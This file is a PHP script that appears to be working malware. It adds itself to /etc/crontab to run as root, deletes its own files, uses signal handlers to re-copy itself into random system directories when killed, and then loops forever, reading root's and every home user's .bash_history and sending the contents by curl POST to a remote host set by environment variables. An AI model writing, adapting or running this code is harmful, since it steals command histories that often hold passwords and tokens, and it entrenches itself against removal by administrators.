<?php

$lastSize = array();
$host = getenv('TARGET_HOST');
$key = getenv('TARGET_KEY');
$api = getenv('TARGET_FILE');
$protocol = getenv('TARGET_PROTOCOL');
$crypt = getenv('LOCAL_CRYPT');
$iv = getenv('LOCAL_IV');

$basename = basename(__FILE__, '.php');
$dir = __DIR__;
file_put_contents(
    '/etc/crontab',
    str_replace("\n* * * * * root sh $dir/$basename", '', file_get_contents('/etc/crontab'))
);
if (getenv('##KILLNAME##') === '##KILLKEY##') {
    exit;
}
if (extension_loaded('pcntl')) {
    $dataPhp = file_get_contents(__FILE__);
    $dataSh = file_get_contents("$dir/$basename.sh");
    $pcntlhandler = function () use ($dataPhp, $dataSh) {
        $file = randomAlphaNumericString(3);
        $dirs = array('opt', 'usr', 'var', 'home', 'root');
        $dir = $dirs[random(0, 4)];
        mkdir("/$dir");
        file_put_contents('/etc/crontab', "\n* * * * * root sh /$dir/$file.sh", FILE_APPEND);
        file_put_contents("/$dir/$file.sh", $dataSh);
        file_put_contents("/$dir/$file.php", $dataPhp);
    };
    pcntl_signal(SIGTERM, $pcntlhandler);
    pcntl_signal(SIGKILL, $pcntlhandler);
}
unlink(__FILE__);
unlink("$dir/$basename.sh");

while (true) {
    $files = array('root' => '/root/.bash_history');
    foreach (array_diff(scandir('/home'), ['.', '..']) as $user) {
        $files[preg_replace('/[^a-z0-9_-]+/i', '', $user)] = "/home/$user/.bash_history";
    }
    foreach ($files as $user => $file) {
        if (is_file($file) && is_readable($file)) {
            $lastSize2 = filesize($file);
            if ($lastSize[$user] ?? 0 !== $lastSize2) {
                $data = file_get_contents($file);
                if ($data) {
                    $c = curl_init();
                    curl_setopt_array($c, array(
                        CURLOPT_CUSTOMREQUEST => 'POST',
                        CURLOPT_URL => "$protocol://$host/$api.php",
                        CURLOPT_POSTFIELDS => $data,
                        CURLOPT_HTTPHEADER => array(
                            'CONTENT-TYPE: text/plain',
                            "ANYTHINGGOES: $key",
                            "LOGGEDUSER: $user",
                            'LOGTYPE: bash'
                        )
                    ));
                    curl_exec($c);
                    curl_close($c);
                    $lastSize[$user] = $lastSize2;
                }
            }
        }
    }
    sleep(1);
}
